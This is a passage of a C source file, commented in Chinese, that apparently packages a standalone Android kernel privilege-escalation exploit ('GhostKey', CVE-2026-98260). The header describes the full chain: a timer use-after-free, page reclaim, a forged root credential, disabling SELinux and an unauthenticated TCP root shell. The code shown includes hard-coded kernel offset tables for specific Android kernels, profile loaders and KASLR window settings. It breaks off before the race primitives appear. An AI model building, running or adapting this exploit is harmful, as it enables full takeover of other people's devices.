/*
 * ============================================================================
 *  CVE-2026-98260 / GhostKey —— 内核提权「利用过程」独立提取版（单文件 C）
 * ============================================================================
 *
 *  本文件是从 GhostKey 仓库（app/src/main/cpp 下的 9 个 C 源文件，共约 5300 行
 *  + Kotlin/Shizuku 编排层）中，把「一次提权实际走过的路径」抽出来，
 *  重组成的一个自包含、可独立编译的 C 源文件。
 *
 *  它不依赖仓库里的任何 .h/.c，不依赖 Shizuku / AIDL / profile blob / APK，
 *  只依赖 libc + Linux 内核接口（tracefs、POSIX timer、socketpair、clone）。
 *
 *  ---------------------------------------------------------------------------
 *  漏洞原理（对齐仓库 README / DeviceBinding / UserService 的注释）
 *  ---------------------------------------------------------------------------
 *  CVE-2026-98260：POSIX CPU timer 的 exec() UAF，自 Linux 5.7 引入。
 *  进程 execve() 时会释放自己的 POSIX timer 对象（struct k_itimer，位于
 *  posix_timers_cache slab）；若此时另一个线程仍在 timer 到期路径上持有该对象
 *  的引用，就形成「已释放但仍在被使用」的悬挂指针。
 *
 *  利用链把它变成一个受限的内核写原语：
 *    1. 造大量 CLOCK_THREAD_CPUTIME_ID timer，让 do_timer_create() 连续分配
 *       k_itimer，制造密集的同尺寸 slab 页；
 *    2. 用 mprotect 风暴 + tgkill(SIGKILL) + execve 精确卡出 UAF 窗口，
 *       使某一个 k_itimer 页被释放，而其内部节点仍挂在内核定时器队列里；
 *    3. 用放大缓冲的 socketpair(AF_UNIX, SOCK_STREAM) 反复写入 8KB 数据，
 *       让内核把刚释放的那个物理页重新分配成 skb 数据页并填入我们构造的内容
 *       （= 页级 UAF 回填 / page-level reclaim）；
 *    4. 回填页里伪造悬挂节点，诱导内核对该节点做一次指针写，
 *       从而把 selinux_enforcing 清零、再把 current->cred 指向页内伪造的
 *       struct cred（uid=0、全 capability）；
 *    5. 用一个常驻子进程 mlockall() 把伪造 cred 所在的页钉住——这页内核已经
 *       不认领了，谁都不能释放它，否则内核访问 current->cred 会踩空 panic。
 *
 *  ---------------------------------------------------------------------------
 *  完整阶段（对应 UserService 的 [1/9]..[9/9]）
 *  ---------------------------------------------------------------------------
 *   [0] 内核画像       内置 6.1.134 / 6.6.118 两套 per-KMI 偏移表，按 uname
 *                      自动匹配；也可 --profile 加载项目 HOCON 文件、--set 覆盖
 *   [1] 校准 A         KASLR slide：timer_probe + kmem_cache_alloc raw trace
 *                      -> call_site 众数 - timer_link
 *   [2] 校准 B         page_offset：order=1 PFN 集合 × k_itimer 虚拟地址集合
 *                      -> 线性映射基址众数解
 *   [3] 地址泄漏       leak_task：fork 一次，从 trace 中定位 current 的
 *                      task_struct（call_site 优先，尺寸窗口兜底），并 fork 出
 *                      cred_child 作为后续伪造 cred 的持有者
 *   [4] 关闭 SELinux   12 轮 one_uaf(selinux_enforcing - 7)，每轮先读
 *                      /sys/fs/selinux/enforce；已经是 0 就立刻停，不重复写。
 *                      加 --skip-selinux-check 则跳过全部读判断，直接执行
 *                      写原语清零（不回读确认结果）
 *   [5] 凭据提权       12 轮 one_uaf(0) 植入伪造 cred，修正 uid/suid，
 *                      经 pipe 让 cred_child 回报 getuid()/geteuid() == 0
 *   [6] 提权后动作     rootd(uid=0 的命令通道) / ksud late-load(KernelSU 接管)
 *                      / netshell(TCP root shell，打印 IP + 端口)
 *   [7] 退场           --daemon-exit：把钉页职责交给 cred_child 后父进程退出
 *
 *  one_uaf(target) 是整个利用的原子原语，每次调用都完整重跑一遍：
 *      child_race()  → collect_nth(1024) → reclaim_stream() → wait_exec_hold()
 *      (fork 竞态)     (取 victim 页)      (socket 回填)        (确认 SIGKILL)
 *
 *  ---------------------------------------------------------------------------
 *  与原始文件的对应关系
 *  ---------------------------------------------------------------------------
 *   main.c                    -> 本文件 main() / 阶段编排 / --exec-ok 快退
 *   kernel_table.{c,h}        -> struct profile + profile_load/set
 *   calib.c / calib_core.c    -> stage_a_calibrate_slide / stage_b_calibrate_lmap
 *   timer_probe.c             -> timer_probe()
 *   uaf_plant.c               -> stage_c..stage_g 全部（本文件的主体）
 *   pc98260_rootd.c / ksu.c / netshell.c -> stage_h（等价简化，见该节注释）
 *   ExploitEngine.kt / Cve98260UserService.kt -> main() 里的阶段顺序与 marker
 *
 *  说明：原仓库里 drain_socks/drain_pipes/drain_aio、reclaim_pipe、
 *  reclaim_dgram、reclaim_and_plant、hold_aio_children、flush_timers
 *  等函数经过完整调用图核查确认「无任何调用点」，属于历史遗留的备选页回收
 *  策略。本文件只保留真实执行路径：reclaim_stream()。
 *  leak_cred_addr() 例外：它由 stage_e 与 --cred-only 调用，不是遗留代码。
 *
 *  ---------------------------------------------------------------------------
 *  编译
 *  ---------------------------------------------------------------------------
 *   Android / arm64（NDK，与仓库 CMake 目标一致）：
 *     aarch64-linux-android31-clang -O2 -std=c11 -pie -Wall -Wextra \
 *         -D_GNU_SOURCE ghostkey_exploit_standalone.c \
 *         -o ghostkey_exploit
 *   桌面 Linux（x86_64，仅用于编译/静态验证，不能真跑利用链）：
 *     gcc -O2 -std=c11 -Wall -Wextra -D_GNU_SOURCE \
 *         ghostkey_exploit_standalone.c -o ghostkey_exploit -lrt
 *
 *  日志着色：默认 auto —— stdout 是 TTY 才上色，重定向到日志文件时自动
 *  关闭，落盘日志与未着色版逐字节兼容。--color=auto|always|never 或
 *  NO_COLOR / C98260_COLOR 覆盖。所有 C98260_* / C98260_STATUS marker
 *  行永远输出纯文本，绝不掺 ANSI 码，保证宿主解析进度不受影响。
 *
 *  运行（真机、已授权）：
 *     ghostkey_exploit -h / --help             查看阶段图与选项
 *     ghostkey_exploit --dump-config           只打印当前画像（安全）
 *     ghostkey_exploit --kaslr-only            仅泄露 KASLR slide（只读校准）
 *     ghostkey_exploit --lmap-only --slide 0x..  仅泄露 page_offset
 *     ghostkey_exploit --cred-only --slide 0x..  仅探测一次 cred 分配地址
 *     ghostkey_exploit -v --lmap-only           调试校准 B（tracefs/errno/计数）
 *
 *  调试日志：-v / -vv / -vvv（或 --verbose=N、env C98260_VERBOSE=N）。
 *  不加 -v 时输出与旧版逐字节一致；所有 C98260_* marker 行永远纯净。
 *     ghostkey_exploit --profile 6.1.134       用内置 6.1.134 画像
 *     ghostkey_exploit --profile /sdcard/release.conf   加载项目导出的 HOCON
 *     ghostkey_exploit --slide 0x... --page-offset 0xffffff7f80000000
 *     ghostkey_exploit --selinux-only         仅关闭 SELinux，不提权/不加载 KSU
 *     ghostkey_exploit --skip-selinux-check   不读 enforce，直接跑写原语清零
 *
 *  ---------------------------------------------------------------------------
 *  声明与风险（与仓库 README 一致）
 *  ---------------------------------------------------------------------------
 *   仅供授权安全研究 / 本人持有设备的合法测试。未经设备所有者明确授权，
 *   对他人设备执行提权可能违反法律与平台条款。
 *   注意：注入阶段有概率导致设备重启甚至内核 panic；伪造 cred 躺在内核不再
 *   认领的物理页里，钉页进程不可被 SIGKILL；nc 终端无认证，仅限可信网络。
 *   这是临时 root，重启后失效。本文件未连接任何真机验证。
 * ============================================================================
 */

#define _GNU_SOURCE 1

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <ifaddrs.h>
#include <inttypes.h>
#include <net/if.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* ---- 平台兜底：让同一个文件在 bionic 与 glibc 下都能编译 ---------------- */
#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif
#ifndef WNOWAIT
#define WNOWAIT 0x01000000
#endif
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif
#ifndef SOCK_CLOEXEC
#define SOCK_CLOEXEC 0
#endif
#ifndef SYS_memfd_create
# ifdef __NR_memfd_create
#  define SYS_memfd_create __NR_memfd_create
# endif
#endif
#ifndef SYS_io_setup
# ifdef __NR_io_setup
#  define SYS_io_setup __NR_io_setup
# endif
#endif
#ifndef SYS_io_destroy
# ifdef __NR_io_destroy
#  define SYS_io_destroy __NR_io_destroy
# endif
#endif

/* ==========================================================================
 * [0] 内核画像（profile）
 * 原项目：kernel_table.c 从 stdin 读 308 字节的 blob v4（由 Kotlin 侧
 * KernelProfileSerializer 序列化）。独立版改为「内置一组真实默认值 +
 * --set key=0x.. 覆盖」，语义等价：所有内核地址都是「静态链接地址」，
 * 运行时必须 slide_addr(link) = link + g_slide 才是本次启动的真实地址。
 * 默认值取自 assets/kernel_profiles/6.6.118-android15-8-...-4k.conf。
 * ========================================================================== */
struct profile {
    char    release[128];
    uint64_t page_offset;       /* 线性映射基址 PAGE_OFFSET */
    uint64_t timer_link;        /* do_timer_create + 0xA8（k_itimer 分配 call site） */
    uint64_t cred_link;         /* prepare_creds + 0x24（cred 分配 call site） */
    uint64_t selinux_link;      /* selinux_enforcing 静态地址 */
    uint64_t user_ns;           /* init_user_ns */
    uint64_t root_user;         /* root_user */
    uint64_t groups;            /* init_groups */
    uint64_t ucounts;           /* init_ucounts */
    uint64_t task_alloc_link;   /* copy_process 里 task_struct 分配的 call site，0=未知 */
    /* --poke 的两个内置目标。0 表示这份画像没带（老版本生成的文件、内置
     * 表里没有的 KMI），此时退回本文件里的 6.1.134 常量并打警告。 */
    uint64_t kptr_link;         /* kptr_restrict */
    uint64_t paranoid_link;     /* sysctl_perf_event_paranoid（写时向下取 8 字节槽） */
    uint64_t panic_link;        /* panic_on_oops */
    uint32_t task_cred;         /* task_struct 内 ->cred 指针的偏移 */
    uint32_t task_struct_size;  /* sizeof(struct task_struct)，BTF 下界 */
    uint32_t kitimer_node;      /* k_itimer 内悬挂节点(timerqueue/rb node)的偏移 */
    uint64_t kitimer_size;      /* sizeof(struct k_itimer)，raw trace 的过滤键 */
    /* 伪造 struct cred 的字段布局（blob v4 / BTF） */
    uint32_t cred_size, cred_uid;
    uint32_t cred_cap_inh, cred_cap_perm, cred_cap_eff, cred_cap_bset, cred_cap_amb;
    uint32_t cred_off_security, cred_off_user, cred_off_user_ns;
    uint32_t cred_off_ucounts, cred_off_groups;
};

/* ---- 内置画像 ------------------------------------------------------------
 * PROFILE_6_6：assets/kernel_profiles/6.6.118-android15-8-...-4k.conf（原默认）
 * PROFILE_6_1：用户提供的 6.1.134-android14-11 boot.img 解析结果
 *              （随附 profile-6.1.134.conf；HOCON 里的负数十进制内核地址已按
 *               uint64 补码换算，例如 -274737900144 -> 0xffffffc008585590）。
 * 两套画像的 struct cred 布局不同：6.6 是 usage@0 / uid@8，6.1 是
 * usage@0 / uid@4。build_stream_pattern() 按 P.cred_uid 自动选分支。
 * 6.1 分支曾按 8 字节槽位写 cred[0..2]，真机实测会把内核地址写进
 * euid、导致提权判据永远失败；现改回只写 4 字节 usage。
 */
static const struct profile PROFILE_6_6 = {
    .release          = "6.6.118-android15-8-g9bc34d5b0c79-abogki537459655-4k",
    .page_offset      = UINT64_C(0xffffff7f80000000),
    .timer_link       = UINT64_C(0xffffffc0801a4dfc),
    .cred_link        = UINT64_C(0xffffffc0800e4074),
    .selinux_link     = UINT64_C(0xffffffc08239c620),
    .user_ns          = UINT64_C(0xffffffc08216f450),
    .root_user        = UINT64_C(0xffffffc08216f6e0),
    .groups           = UINT64_C(0xffffffc082170c40),
    .ucounts          = UINT64_C(0xffffffc0821711b0),
    .task_alloc_link  = 0,
    .task_cred        = 0x820,
    .task_struct_size = 0x12c0,
    .kitimer_node     = 0x78,
    .kitimer_size     = 0x108,
    /* android15-8 / 6.6.x 的 struct cred：size=184, uid@8, caps 48..80,
     * security@128, user@136, ns@144, ucounts@152, groups@160 */
    .cred_size        = 184,
    .cred_uid         = 8,
    .cred_cap_inh     = 48, .cred_cap_perm = 56, .cred_cap_eff = 64,
    .cred_cap_bset    = 72, .cred_cap_amb  = 80,
    .cred_off_security = 128, .cred_off_user = 136, .cred_off_user_ns = 144,
    .cred_off_ucounts  = 152, .cred_off_groups = 160,
};

static const struct profile PROFILE_6_1 = {
    .release          = "6.1.134-android14-11-o-g5b336363ebad",
    .page_offset      = UINT64_C(0xffffff7f80000000),
    .timer_link       = UINT64_C(0xffffffc008585590),
    .cred_link        = UINT64_C(0xffffffc008046694),
    .selinux_link     = UINT64_C(0xffffffc00a25afd8),
    .user_ns          = UINT64_C(0xffffffc00a030a70),
    .root_user        = UINT64_C(0xffffffc00a030d00),
    .groups           = UINT64_C(0xffffffc00a032020),
    .ucounts          = UINT64_C(0xffffffc00a032588),
    .task_alloc_link  = UINT64_C(0xffffffc0083c7780),
    .kptr_link        = UINT64_C(0xffffffc00a01d5f8),
    .paranoid_link    = UINT64_C(0xffffffc00a00ba7c),
    .panic_link       = UINT64_C(0xffffffc00a02bfa8),
    .task_cred        = 0x838,
    .task_struct_size = 0x12c0,
    .kitimer_node     = 0x78,
    .kitimer_size     = 0x108,
    /* android14-11 / 6.1.x 的 struct cred：size=176, uid@4, caps 40..72,
     * security@120, user@128, ns@136, ucounts@144, groups@152 */
    .cred_size        = 176,
    .cred_uid         = 4,
    .cred_cap_inh     = 40, .cred_cap_perm = 48, .cred_cap_eff = 56,
    .cred_cap_bset    = 64, .cred_cap_amb  = 72,
    .cred_off_security = 120, .cred_off_user = 128, .cred_off_user_ns = 136,
    .cred_off_ucounts  = 144, .cred_off_groups = 152,
};

/* 当前生效画像。C 里静态存储期对象不能用另一个变量做初始化器，因此 P 先
 * 零初始化，main() 里显式 P = PROFILE_6_6 装默认值，再由 --profile /
 * uname 自动匹配整体替换，最后 --set 做单字段覆盖。 */
static struct profile P;

/* ==========================================================================
 * 日志着色
 * 铁律：只有「给人看」的行着色；所有 \x1e C98260_STATUS 与 C98260_* marker
 * 行永远输出纯文本，绝不掺 ANSI 字节——宿主(Kotlin/Shizuku)靠这些行解析
 * 进度与结果，被颜色码包住就会解析失败。因此下面 emit_status() 和各
 * C98260_* 行都刻意不经过 clog_line()。
 * 默认 auto：stdout 是 TTY 才上色；重定向到日志文件时自动关闭，落盘日志
 * 与未着色版本逐字节兼容。--color=always|never|auto / NO_COLOR 可覆盖。
 * ========================================================================== */
/* 统一三色规范：
 *   正常运行 / 提示 / 警告 / 配置 / 数值 / 耗时 → 黄
 *   成功 / 达成                              → 绿
 *   失败 / 错误                              → 红
 * 所有 LOG_* 与 STAGE_LOG 只用这三色；marker 行始终裸输出不着色。 */
#define C_RESET   "\033[0m"
#define C_RED     "\033[1;31m"   /* 失败 / 错误 */
#define C_GREEN   "\033[1;32m"   /* 成功 / 达成 */
#define C_YELLOW  "\033[1;33m"   /* 正常运行 / 提示 / 警告 */

static int g_color;              /* 最终开关，由 color_apply() 算出 */
static int g_color_mode;         /* 0=auto 1=always 2=never */

/* -v 调试等级：0=常规（输出与旧版逐字节一致）1=调试 2=详细 3=逐条。
 * 所有 LOG_V* 都是「人读」日志行，绝不包裹 C98260_* / STATUS marker。
 * -v / -vv / -vvv / --verbose=N / env C98260_VERBOSE=N 设置。 */
static int g_verbose;

static void color_apply(void)
{
    g_color = (g_color_mode == 1) ||
              (g_color_mode == 0 && isatty(STDOUT_FILENO) != 0);
}

static void color_init(void)     /* 读环境变量，再套用 mode */
{
    const char *e = getenv("C98260_COLOR");
    if (e) {
        if (!strcmp(e, "always") || !strcmp(e, "1")) g_color_mode = 1;
        else if (!strcmp(e, "never") || !strcmp(e, "0")) g_color_mode = 2;
        else if (!strcmp(e, "auto")) g_color_mode = 0;
    }
    /* NO_COLOR 是社区通用约定；显式 always 可以压过它 */
    if (g_color_mode != 1 && getenv("NO_COLOR")) g_color_mode = 2;
    color_apply();
}

/* 一条着色日志。格式串里原有的 \n 会被去掉，统一输出成
 * "<颜色>正文<复位>\n"，保证复位码落在换行之前，绝不污染下一行 marker。
 * vasprintf 在 glibc / bionic 下都可用（本文件已定义 _GNU_SOURCE）。 */
static void clog_line(const char *color, const char *fmt, ...)
{
    va_list ap;
    char *buf = NULL;
    int n;
    va_start(ap, fmt);
    n = vasprintf(&buf, fmt, ap);
    va_end(ap);
    if (n < 0 || !buf) return;
    while (n > 0 && buf[n - 1] == '\n') buf[--n] = 0;
    if (g_color) dprintf(STDOUT_FILENO, "%s%s%s\n", color, buf, C_RESET);
    else         dprintf(STDOUT_FILENO, "%s\n", buf);
    free(buf);
}

/* stderr 错误行：同样只在开关打开时加码 */
static void elog(const char *fmt, ...)
{
    va_list ap;
    char *buf = NULL;
    int n;
    va_start(ap, fmt);
    n = vasprintf(&buf, fmt, ap);
    va_end(ap);
    if (n < 0 || !buf) return;
    while (n > 0 && buf[n - 1] == '\n') buf[--n] = 0;
    if (g_color) fprintf(stderr, "%s%s%s\n", C_RED, buf, C_RESET);
    else         fprintf(stderr, "%s\n", buf);
    free(buf);
}

#define LOG_INFO(fmt, ...)  clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 正常运行 */
#define LOG_OK(fmt, ...)    clog_line(C_GREEN,  fmt, ##__VA_ARGS__)  /* 成功 */
#define LOG_WARN(fmt, ...)  clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 警告 */
#define LOG_ERR(fmt, ...)   clog_line(C_RED,    fmt, ##__VA_ARGS__)  /* 失败 */
#define LOG_CFG(fmt, ...)   clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 配置 */
#define LOG_LEAK(fmt, ...)  clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 数值 */
#define LOG_DIM(fmt, ...)   clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 次要 */
#define LOG_TIME(fmt, ...)  clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 耗时 */
/* 分级调试日志：等级不够时整条语句被编译优化掉，0 输出、0 副作用 */
#define LOG_V1(fmt, ...) do { if (g_verbose >= 1) clog_line(C_YELLOW, "[v1] " fmt, ##__VA_ARGS__); } while (0)
#define LOG_V2(fmt, ...) do { if (g_verbose >= 2) clog_line(C_YELLOW, "[v2] " fmt, ##__VA_ARGS__); } while (0)
#define LOG_V3(fmt, ...) do { if (g_verbose >= 3) clog_line(C_YELLOW, "[v3] " fmt, ##__VA_ARGS__); } while (0)

/* ==========================================================================
 * 阶段耗时
 * 单调时钟，只写「人读」日志行；C98260_* / STATUS marker 仍是裸输出，不受影响。
 * 用法：进入利用链时 timing_start()；每个阶段前 stage_begin()，完成后
 * stage_done(name, note)；跳过的阶段 stage_skipped(name)；所有出口 finish(rc)
 * 统一打印全程累计。帮助 / --dump-config / 参数错误不进入利用链，不打印耗时。
 * ========================================================================== */
static double now_sec(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1e9;
}
static double g_run_t0;        /* 全程起点 */
static double g_stage_t0;      /* 当前阶段起点 */
static int    g_timing_armed;  /* 已进入利用链才打印总耗时 */

static void timing_start(void) { g_run_t0 = now_sec(); g_timing_armed = 1; }
static void stage_begin(void)  { g_stage_t0 = now_sec(); }

/* note 传 NULL 表示正常完成；传 "失败"/"未命中，降级" 等则附在括号里 */
static void stage_done(const char *name, const char *note)
{
    double d = now_sec() - g_stage_t0;
    if (note && *note) LOG_TIME("[耗时] %s 用时 %.2f 秒（%s）", name, d, note);
    else               LOG_TIME("[耗时] %s 用时 %.2f 秒", name, d);
}
static void stage_skipped(const char *name)
{ LOG_TIME("[耗时] %s 用时 0.00 秒（已跳过）", name); }

/* 所有利用链出口统一走这里，避免漏打印总耗时 */
static int finish(int rc)
{
    if (g_timing_armed)
        LOG_TIME("[耗时] 全程累计用时 %.2f 秒", now_sec() - g_run_t0);
    return rc;
}

/* STAGE_LOG：按正文里的中文关键词自动分级着色（统一三色）。
 * 失败→红，成功→绿，其余（正常运行 / 警告 / 进度）→黄。 */
static const char *stage_color(const char *fmt)
{
    if (strstr(fmt, "失败") || strstr(fmt, "错误") || strstr(fmt, "异常") ||
        strstr(fmt, "无法") || strstr(fmt, "放不下") || strstr(fmt, "重叠") ||
        strstr(fmt, "不合理") || strstr(fmt, "不是 SIGKILL") ||
        strstr(fmt, "发送守护指令失败")) return C_RED;
    if (strstr(fmt, "已确认") || strstr(fmt, "命中") || strstr(fmt, "完成") ||
        strstr(fmt, "已植入") || strstr(fmt, "已监听")) return C_GREEN;
    return C_YELLOW;
}

#define FULLCAP UINT64_C(0x1ffffffffff)

/*
 * Gap between the k_itimer rb_node and the forged cred.
 *
 * The rb_node sits exactly at victim+kitimer_node. On 5.15/6.1
 * cred->usage(4B)+uid(4B) overlay __rb_parent_color, so "usage != 0 && uid == 0"
 * always produces a __rb_parent_color with zero high half; rb_parent() then
 * returns a user-range pointer and the race child's exit walks it in
 * posix_cpu_timers_exit -> timerqueue_del -> rb_next (level-1 translation
 * fault, panic). Placing the cred CRED_SHIFT bytes away lets the rb_node stay a
 * zeroed leaf (parent == NULL) while the cred keeps usage != 0 and uid == 0.
 */
#define CRED_SHIFT 0x40u
#define TASK_VENDOR_EXTRA_MAX 0x400U   /* 厂商对 task_struct 的追加量上限 */

/* HOCON 画像里的字段名与 struct profile 字段名并不完全一致（项目序列化时
 * 用的是 BTF 语义名）。加载文件、以及 --set 用 HOCON 原名时都过这层别名。 */
static const char *profile_key_alias(const char *key)
{
    static const struct { const char *from, *to; } tbl[] = {
        { "cred_cap_inheritable", "cred_cap_inh" },
        { "cred_cap_permitted",   "cred_cap_perm" },
        { "cred_cap_effective",   "cred_cap_eff" },
        { "cred_cap_ambient",     "cred_cap_amb" },
        { "cred_security",        "cred_off_security" },
        { "cred_user_ns",         "cred_off_user_ns" },
        { "cred_ucounts",         "cred_off_ucounts" },
        { "cred_user",            "cred_off_user" },
        { "cred_groups",          "cred_off_groups" },
        /* 写零目标的符号名：允许画像里直接写 kallsyms 里的名字 */
        { "kptr_restrict",        "kptr_link" },
        { "perf_event_paranoid",  "paranoid_link" },
        { "sysctl_perf_event_paranoid", "paranoid_link" },
        { "panic_on_oops",        "panic_link" },
    };
    for (size_t i = 0; i < sizeof(tbl) / sizeof(tbl[0]); i++)
        if (!strcmp(key, tbl[i].from)) return tbl[i].to;
    return key;
}

/* 统一字段写入：--set 与 HOCON 画像文件解析共用 --------------------------- */
static int profile_apply(const char *key, uint64_t v)
{
    key = profile_key_alias(key);
#define SETU64(f) if (!strcmp(key, #f)) { P.f = v; return 0; }
#define SETU32(f) if (!strcmp(key, #f)) { P.f = (uint32_t)v; return 0; }
    SETU64(page_offset); SETU64(timer_link); SETU64(cred_link);
    SETU64(selinux_link); SETU64(user_ns); SETU64(root_user);
    SETU64(groups); SETU64(ucounts); SETU64(task_alloc_link);
    SETU64(kptr_link); SETU64(paranoid_link); SETU64(panic_link);
    SETU64(kitimer_size);
    SETU32(task_cred); SETU32(task_struct_size); SETU32(kitimer_node);
    SETU32(cred_size); SETU32(cred_uid);
    SETU32(cred_cap_inh); SETU32(cred_cap_perm); SETU32(cred_cap_eff);
    SETU32(cred_cap_bset); SETU32(cred_cap_amb);
    SETU32(cred_off_security); SETU32(cred_off_user); SETU32(cred_off_user_ns);
    SETU32(cred_off_ucounts); SETU32(cred_off_groups);
#undef SETU64
#undef SETU32
    return -1;
}

/* --set key=value（也接受 offset.key=...；负数按 uint64 补码回绕） */
static int profile_set(const char *kv)
{
    const char *eq = strchr(kv, '=');
    char key[64];
    size_t n;
    if (!eq) return -1;
    n = (size_t)(eq - kv);
    if (n == 0 || n >= sizeof(key)) return -1;
    memcpy(key, kv, n); key[n] = 0;
    if (!strncmp(key, "offset.", 7)) memmove(key, key + 7, strlen(key + 7) + 1);
    /* strtoull 遇到前导 '-' 会按 C 标准取反回绕，正好把 HOCON 里的
     * -274737900144 还原成 0xffffffc008585590。 */
    uint64_t v = strtoull(eq + 1, NULL, 0);
    int rc = profile_apply(key, v);
    return rc;
}

/* 解析项目原生 HOCON 画像（release.conf / profile.txt / boot.img 导出文件）。
 * 只认 "key = value" 行：字符串给 release，数值给偏移；offset {} 块、
 * 注释(# //)、引号、逗号、花括号随手剥掉，_source 等未知字段忽略。 */
static int profile_load_hocon(const char *path)
{
    FILE *f = fopen(path, "r");
    char line[512];
    int applied = 0;
    if (!f) return -1;
    while (fgets(line, sizeof(line), f)) {
        char *hash, *slash, *eq, *key, *val, *end;
        hash = strchr(line, '#');   if (hash) *hash = 0;
        slash = strstr(line, "//"); if (slash) *slash = 0;
        eq = strchr(line, '=');
        if (!eq) continue;
        *eq = 0;
        key = line; val = eq + 1;
        while (*key == ' ' || *key == '\t' || *key == '{' || *key == '\n') key++;
        end = key + strlen(key);
        while (end > key && (end[-1] == ' ' || end[-1] == '\t' ||
                            end[-1] == '\n' || end[-1] == '\r')) *--end = 0;
        while (*val == ' ' || *val == '\t' || *val == '"') val++;
        end = val + strlen(val);
        while (end > val && (end[-1] == ' ' || end[-1] == '\t' ||
                            end[-1] == '\n' || end[-1] == '\r' ||
                            end[-1] == ',' || end[-1] == '}' || end[-1] == '"')) *--end = 0;
        if (!*key || !*val) continue;
        if (!strncmp(key, "offset.", 7)) key += 7;
        if (!strcmp(key, "release")) {
            snprintf(P.release, sizeof(P.release), "%s", val);
            applied++;
            continue;
        }
        if (profile_apply(key, strtoull(val, NULL, 0)) == 0)
            applied++;
    }
    fclose(f);
    if (applied < 20) return -1;
    /*
     * cred_link 校验。
     *
     * 真机日志里出现过 cred_link=0xfffffff000846694，而正确值是
     * 0xffffffc008046694 —— 差在 32 位段，raw 匹配会永远命不中。
     * 判据：cred_link 和 timer_link 都是内核 .text 里的返回地址，
     * 高 32 位必然相同（KASLR slide 不会跨 4G 段）。不同就回退内置值。
     */
    if ((P.cred_link >> 32) != (P.timer_link >> 32)) {
        uint64_t fb = 0;
        if (strstr(P.release, "6.1")) fb = PROFILE_6_1.cred_link;
        else if (strstr(P.release, "6.6")) fb = PROFILE_6_6.cred_link;
        if (fb) P.cred_link = fb;
    }
    return 0;
}

/* --profile NAME|PATH：内置关键字，或直接给 HOCON 文件路径 */
static int profile_select(const char *arg)
{
    if (!strncmp(arg, "6.1", 3) || !strcmp(arg, "android14")) {
        P = PROFILE_6_1;
        return 0;
    }
    if (!strncmp(arg, "6.6", 3) || !strcmp(arg, "android15")) {
        P = PROFILE_6_6;
        return 0;
    }
    return profile_load_hocon(arg);
}

/* 未显式指定画像时按 uname 自动匹配，避免把 6.6 的偏移套到 6.1 内核上。 */
static void profile_auto_select(void)
{
    struct utsname u;
    if (uname(&u)) return;
    if (!strncmp(u.release, "6.1.134", 7)) {
        P = PROFILE_6_1;
    } else if (!strncmp(u.release, "6.6.118", 7)) {
        P = PROFILE_6_6;
    }
    /* 未匹配任何内置画像时保持默认 PROFILE_6_6。 */
}

/* ==========================================================================
 * 全局状态
 * ========================================================================== */
static uint64_t g_slide;         /* KASLR slide，随每次启动变化 */
static int g_slide_known;        /* slide 是否可信（stage_a 命中或 --slide 给定） */
static uint64_t g_task;          /* current 的 task_struct 内核虚拟地址 */
static int g_panic_defused;      /* panic_on_oops 是否已清零 */
static int g_kallsyms_ok;        /* /proc/kallsyms 是否已能读到真实符号值 */
static uint64_t g_cred_kva;      /* 回填页里伪造 cred 的内核线性地址 */
static int      g_plant_cred;    /* 回填形态：0=平铺 rb_node，1=伪造 struct cred */
static int      g_kmem_filter_ok; /* kmem_cache_alloc 的 pid filter 是否生效 */
static int      g_fast;          /* PLANT_FAST：缩短回填等待轮数 */
static int      g_selinux_only;  /* 仅关闭 SELinux，不提权、不启动 KSU/netshell */
static int      g_skip_selinux_check; /* 跳过 enforce 读判断，直接写原语清零 */
/* ---- KASLR slide 窗口：按 arm64 新版公式推导，不再拍脑袋 -----------------
 *
 * 上游 arch/arm64/kernel/pi/kaslr_early.c：
 *
 *     mask   = ((1UL << (VA_BITS_MIN - 2)) - 1) & ~(SZ_2M - 1);
 *     offset = BIT(VA_BITS_MIN - 3) + (seed & mask);
 *
 * VA_BITS_MIN = 39（本机 39-bit VA）时：
 *     mask   = ((1<<37)-1) & ~0x1FFFFF = 0x1FFFE00000（128 GiB - 2 MiB）
 *     offset ∈ [BIT(36), BIT(36)+mask] = [0x1000000000, 0x2FFFE00000]
 *              = [64 GiB, 192 GiB)，步进 2 MiB
 *
 * 也就是说 slide 不是「从 _text 链接地址到 VA 顶随便取」，而是被钉在
 * 64~192 GiB 这条 128 GiB 宽的带上。以前按「_text 到 VA 顶」把上限放到
 * 254 GiB（0x3f80000000），等于把 vmemmap 一带（0xfffffffdxxxxxxxx，
 * 换算成 slide 就是两百四十多 GiB）的值也放进候选池 —— 这正是「244 GiB
 * slide、202 票」的来历：票数再高也不是 do_timer_create 的 call_site。
 * 反过来，152 GiB（0x2604c00000）在这个窗口内，是合法值。
 *
 * 48-bit VA 的机器用 --va-bits 48，窗口变成 [32 TiB, 96 TiB)。
 * 厂商若改过这个公式、或遇到老式内核（slide 只有几百 MB），用
 * --max-slide 0x.. 显式覆盖上界（同时放开下界）。
 */
#define GK_DEFAULT_VA_BITS 39
#define GK_SZ_2M           (UINT64_C(1) << 21)

static uint64_t g_va_bits   = GK_DEFAULT_VA_BITS;
static uint64_t g_slide_min = UINT64_C(0x1000000000);   /* BIT(36) = 64 GiB */
static uint64_t g_slide_max = UINT64_C(0x2FFFE00000);   /* +mask  = 192 GiB - 2M */
/* --max-slide / 手工 --slide 显式给了超出公式窗口的值：此时只校验上界，
 * 不再卡公式下界，免得把厂商定制的窗口误判成噪声。 */
static int      g_slide_max_user;

/* 按 g_va_bits 重算窗口。必须在参数解析完成后调用一次。 */
static void kaslr_window_init(void)
